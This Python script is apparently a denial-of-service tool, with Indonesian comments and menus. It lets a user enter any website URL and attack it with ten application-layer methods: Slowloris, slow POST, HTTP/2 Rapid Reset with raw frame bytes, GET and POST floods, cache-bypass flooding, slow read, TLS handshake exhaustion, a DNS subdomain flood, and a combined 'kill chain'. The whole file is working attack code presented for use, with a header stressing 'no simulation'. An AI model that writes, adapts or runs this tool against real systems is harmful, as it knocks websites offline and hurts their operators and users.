#!/usr/bin/env python3
# language: Python 3.8+
# file: web_havoc_l7.py
# 10 Vektor L7 (Application Layer) - Tanpa Root, Tanpa Simulasi.
# Termux: pip install requests

import os, sys, time, socket, ssl, random, string, threading, urllib.parse, requests
from concurrent.futures import ThreadPoolExecutor

# ── WARNA HIJAU NEON ──
G1  = "\033[38;5;46m"   
G2  = "\033[38;5;118m"  
G3  = "\033[38;5;22m"   
W   = "\033[97m" 
R   = "\033[91m" 
Y   = "\033[93m" 
D   = "\033[90m" 
RST = "\033[0m"

def clr():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{G1}
╔══════════════════════════════════════════════════════════════════════════╗
║  ██╗    ██╗███████╗██████╗     ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗  ██████╗
║  ██║    ██║██╔════╝██╔══██╗    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
║  ██║ █╗ ██║█████╗  ██████╔╝    ███████║███████║██║   ██║██║   ██║██║     
║  ██║███╗██║██╔══╝  ██╔══██╗    ██╔══██║██╔══██║╚██╗ ██╔╝██║   ██║██║     
║  ╚███╔███╔╝███████╗██████╔╝    ██║  ██║██║  ██║ ╚████╔╝ ╚██████╔╝╚██████╗
║   ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝  ╚═════╝
║                                                                          
║         {G2}1 0   V E K T O R   ·   L A Y E R   7   ·   N O   R O O T{RST}{G1}
╚══════════════════════════════════════════════════════════════════════════╝{RST}
""")

def ask(p, d=None, k=str):
    suf = f" {D}[{d}]{RST}" if d is not None else ""
    while True:
        try: s = input(f"  {G1}»{RST} {W}{p}{RST}{suf}: ").strip()
        except: sys.exit(0)
        if not s and d is not None: return d
        if not s: continue
        try: return k(s)
        except: print(f"  {R}Format salah.{RST}")

def parse_target(url):
    if not url.startswith("http"): url = "http://" + url
    parsed = urllib.parse.urlparse(url)
    return parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80), parsed.scheme == "https", parsed.path or "/"

def rand_str(n=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

# ═══════════════════════ 10 VEKTOR L7 ═══════════════════════

def monitor(secs):
    t0 = time.time()
    try:
        while time.time() - t0 < secs:
            time.sleep(1)
            sys.stdout.write(f"\r  {G2}»{RST} Menyerang Web... {int(time.time()-t0)}/{secs}s   ")
            sys.stdout.flush()
        print()
    except KeyboardInterrupt: pass

# 1. Slowloris
def v_slowloris(host, port, is_ssl, path, secs, th):
    print(f"  {G2}[*] Memulai Slowloris...{RST}")
    sockets = []
    for _ in range(th):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4); s.connect((host, port))
            if is_ssl:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.send(f"GET {path}?{rand_str()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nX-Pad: ".encode())
            sockets.append(s)
        except: pass
    
    t0 = time.time()
    while time.time() - t0 < secs:
        for s in list(sockets):
            try: s.send(f"X-{rand_str(3)}: {rand_str(3)}\r\n".encode())
            except: 
                try: s.close() 
                except: pass
                sockets.remove(s)
        time.sleep(5)
    for s in sockets: s.close()

# 2. RUDY (Are You Dead Yet)
def v_rudy(host, port, is_ssl, path, secs, th):
    print(f"  {G2}[*] Memulai RUDY (Slow POST)...{RST}")
    sockets = []
    for _ in range(th):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5); s.connect((host, port))
            if is_ssl:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1000000\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n"
            s.send(req.encode())
            sockets.append(s)
        except: pass
    
    t0 = time.time()
    while time.time() - t0 < secs:
        for s in list(sockets):
            try: s.send(b"A")
            except: 
                try: s.close()
                except: pass
                sockets.remove(s)
        time.sleep(3)
    for s in sockets: s.close()

# 3. HTTP/2 Rapid Reset
def v_rapid_reset(host, port, secs, th):
    print(f"  {G2}[*] Memulai HTTP/2 Rapid Reset (Bikin CPU Server Jebol)...{RST}")
    # Frame HTTP/2 murni (Preface + SETTINGS + HEADERS + RST_STREAM)
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    headers = b"\x00\x00\x0f\x01\x05\x00\x00\x00\x01\x82\x84\x86\x41\x8a\x08\x9d\x5c\x0b\x81\x70\xdc\x78\x0f\x03"
    rst = b"\x00\x00\x04\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00"
    packet = preface + settings + headers + rst

    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2); s.connect((host, port))
                if port == 443:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host, alpn_protocols=["h2"])
                s.sendall(packet)
                s.close()
            except: pass

    threads = [threading.Thread(target=worker) for _ in range(th)]
    for t in threads: t.start()
    monitor(secs)
    stop.set()
    for t in threads: t.join()

# 4. HTTP GET Flood
def v_get_flood(host, port, is_ssl, path, secs, th):
    print(f"  {G2}[*] Memulai HTTP GET Flood...{RST}")
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3); s.connect((host, port))
                if is_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.send(f"GET {path}?{rand_str()} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                s.recv(1024); s.close()
            except: pass

    threads = [threading.Thread(target=worker) for _ in range(th)]
    for t in threads: t.start()
    monitor(secs)
    stop.set()
    for t in threads: t.join()

# 5. HTTP POST Flood
def v_post_flood(host, port, is_ssl, path, secs, th):
    print(f"  {G2}[*] Memulai HTTP POST Flood...{RST}")
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3); s.connect((host, port))
                if is_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                body = "A=" + rand_str(1000)
                req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n{body}"
                s.send(req.encode())
                s.recv(1024); s.close()
            except: pass

    threads = [threading.Thread(target=worker) for _ in range(th)]
    for t in threads: t.start()
    monitor(secs)
    stop.set()
    for t in threads: t.join()

# 6. Cache Bypass Flood
def v_cache_bypass(host, port, is_ssl, path, secs, th):
    print(f"  {G2}[*] Memulai Cache Bypass (Hantam Database)...{RST}")
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3); s.connect((host, port))
                if is_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                # Pake parameter unik biar CDN nganggep ini halaman baru
                p = f"{path}?nocache={rand_str(12)}&t={time.time()}"
                s.send(f"GET {p} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
                s.recv(1024); s.close()
            except: pass

    threads = [threading.Thread(target=worker) for _ in range(th)]
    for t in threads: t.start()
    monitor(secs)
    stop.set()
    for t in threads: t.join()

# 7. Slow Read
def v_slow_read(host, port, is_ssl, path, secs, th):
    print(f"  {G2}[*] Memulai Slow Read (TCP Window Zero)...{RST}")
    sockets = []
    for _ in range(th):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5); s.connect((host, port))
            if is_ssl:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.send(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
            sockets.append(s)
        except: pass

    t0 = time.time()
    while time.time() - t0 < secs:
        for s in list(sockets):
            try: s.recv(1) # Baca 1 byte per detik
            except: 
                try: s.close()
                except: pass
                sockets.remove(s)
        time.sleep(1.5)
    for s in sockets: s.close()

# 8. TLS Handshake Exhaust
def v_tls_exhaust(host, port, secs, th):
    print(f"  {G2}[*] Memulai TLS Handshake Exhaust...{RST}")
    stop = threading.Event()
    def worker():
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3); s.connect((host, port))
                ss = ctx.wrap_socket(s, server_hostname=host)
                ss.close()
            except: pass

    threads = [threading.Thread(target=worker) for _ in range(th)]
    for t in threads: t.start()
    monitor(secs)
    stop.set()
    for t in threads: t.join()

# 9. DNS Subdomain Flood
def v_dns_flood(host, secs, th):
    print(f"  {G2}[*] Memulai DNS Subdomain Flood (Hantam DNS Target)...{RST}")
    import dns.resolver # pip install dnspython
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                sub = f"{rand_str(5)}.{host}"
                dns.resolver.resolve(sub, 'A')
            except: pass

    try:
        threads = [threading.Thread(target=worker) for _ in range(th)]
        for t in threads: t.start()
        monitor(secs)
        stop.set()
        for t in threads: t.join()
    except ImportError:
        print(f"  {R}Butuh library: pip install dnspython{RST}")

# 10. KILL CHAIN L7
def v_kill_chain(host, port, is_ssl, path, secs):
    print(f"\n  {R}[!] MEMULAI KILL CHAIN LAYER 7...{RST}")
    print(f"  {D}Menembak Web Target dengan 5 Vektor Sekaligus.{RST}\n")
    
    th = 100
    t1 = threading.Thread(target=v_slowloris, args=(host, port, is_ssl, path, secs, th))
    t2 = threading.Thread(target=v_rapid_reset, args=(host, port, secs, th))
    t3 = threading.Thread(target=v_post_flood, args=(host, port, is_ssl, path, secs, th))
    t4 = threading.Thread(target=v_cache_bypass, args=(host, port, is_ssl, path, secs, th))
    
    t1.start(); t2.start(); t3.start(); t4.start()
    monitor(secs)
    
    t1.join(); t2.join(); t3.join(); t4.join()
    print(f"  {G1}✔ Kill Chain Selesai.{RST}")

# ═══════════════════════ MENU ═══════════════════════
def menu():
    while True:
        clr()
        print(f"  {G1}╭────────────────────────────────────────────────────╮{RST}")
        print(f"  {G1}│{RST} {W}PILIH VEKTOR WEB (1-10):{RST}                              {G1}│{RST}")
        print(f"  {G1}╰────────────────────────────────────────────────────╯{RST}")
        print(f"  {G1}[1]{RST}  Slowloris (Tahan Koneksi)")
        print(f"  {G1}[2]{RST}  RUDY (Slow POST Body)")
        print(f"  {G1}[3]{RST}  HTTP/2 Rapid Reset (CPU Jebol)")
        print(f"  {G1}[4]{RST}  HTTP GET Flood (Spam Request)")
        print(f"  {G1}[5]{RST}  HTTP POST Flood (Spam Data)")
        print(f"  {G1}[6]{RST}  Cache Bypass (Hantam Database)")
        print(f"  {G1}[7]{RST}  Slow Read (TCP Zero Window)")
        print(f"  {G1}[8]{RST}  TLS Handshake Exhaust (Beban SSL)")
        print(f"  {G1}[9]{RST}  DNS Subdomain Flood (Hantam Nameserver)")
        print(f"  {R}[10]{RST} KILL CHAIN L7 (Gempur Total)")
        print(f"  {G1}[0]{RST}  Keluar")
        print(f"  {G1}──────────────────────────────────────────────────────{RST}")
        
        try: c = input(f"  {G1}»{RST} Pilih [0-10]: ").strip()
        except: break
        
        if c == "0": break
        if c not in [str(i) for i in range(1, 11)]: continue

        target = ask("URL Website Target (contoh: http://target.com)")
        host, port, is_ssl, path = parse_target(target)
        print(f"  {G}✔{RST} Target: {host}:{port} (SSL: {is_ssl})")
        
        secs = ask("Durasi (detik)", 60, int)
        th = ask("Jumlah Thread", 200, int)

        if c == "1": v_slowloris(host, port, is_ssl, path, secs, th)
        elif c == "2": v_rudy(host, port, is_ssl, path, secs, th)
        elif c == "3": v_rapid_reset(host, port, secs, th)
        elif c == "4": v_get_flood(host, port, is_ssl, path, secs, th)
        elif c == "5": v_post_flood(host, port, is_ssl, path, secs, th)
        elif c == "6": v_cache_bypass(host, port, is_ssl, path, secs, th)
        elif c == "7": v_slow_read(host, port, is_ssl, path, secs, th)
        elif c == "8": v_tls_exhaust(host, port, secs, th)
        elif c == "9": v_dns_flood(host, secs, th)
        elif c == "10": v_kill_chain(host, port, is_ssl, path, secs)

        input(f"\n  {D}[Enter untuk kembali]{RST}")

if __name__ == "__main__":
    try: menu()
    except KeyboardInterrupt: print()